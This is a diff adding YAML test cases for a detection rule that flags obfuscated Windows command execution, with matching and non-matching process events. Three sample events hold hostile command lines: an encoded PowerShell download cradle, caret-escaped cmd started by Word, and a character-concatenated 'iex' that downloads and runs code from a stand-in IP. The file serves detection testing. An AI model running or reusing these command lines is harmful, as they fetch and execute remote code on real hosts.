@@ -1,0 +1,53 @@
+rule: TH-015-obfuscated-command-execution
+description: >
+  Positives are the three obfuscation families the analytic claims to cover. Negatives are the two
+  shapes that break naive length-based heuristics: a long structured installer command line and a
+  normal robocopy invocation with many switches.
+cases:
+  - name: Encoded PowerShell payload
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Caret-escaped cmd obfuscation
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'c^m^d.e^x^e /c p^o^w^e^r^s^h^e^l^l -c whoami'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\winword.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Character-array concatenation
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: "powershell.exe -c $a=[char]105+[char]101+[char]120; & $a (New-Object Net.WebClient).DownloadString('http://198.51.100.5/p')"
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Long structured installer command line
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c "C:\Program Files\Contoso\Setup\install.exe" /quiet /norestart INSTALLDIR="C:\Program Files\Contoso\Agent" LICENSEKEY=CONTOSO-2026-ENTERPRISE LOGFILE="C:\ProgramData\Contoso\install.log"'
+      ParentImage: 'C:\Windows\System32\msiexec.exe'
+      User: 'NT AUTHORITY\SYSTEM'
+
+  - name: Normal robocopy invocation
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c robocopy D:\Data E:\Backup /MIR /R:2 /W:5 /MT:16 /LOG:E:\backup.log'
+      ParentImage: 'C:\Windows\System32\taskeng.exe'
+      User: 'NT AUTHORITY\SYSTEM'
+
+  - name: Non-interpreter process with a base64-looking argument
+    expect: no_match
+    event:
+      Image: 'C:\Program Files\Contoso\Sync\sync.exe'
+      CommandLine: 'sync.exe --token QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk='
+      ParentImage: 'C:\Windows\System32\services.exe'
+      User: 'NT AUTHORITY\SYSTEM'
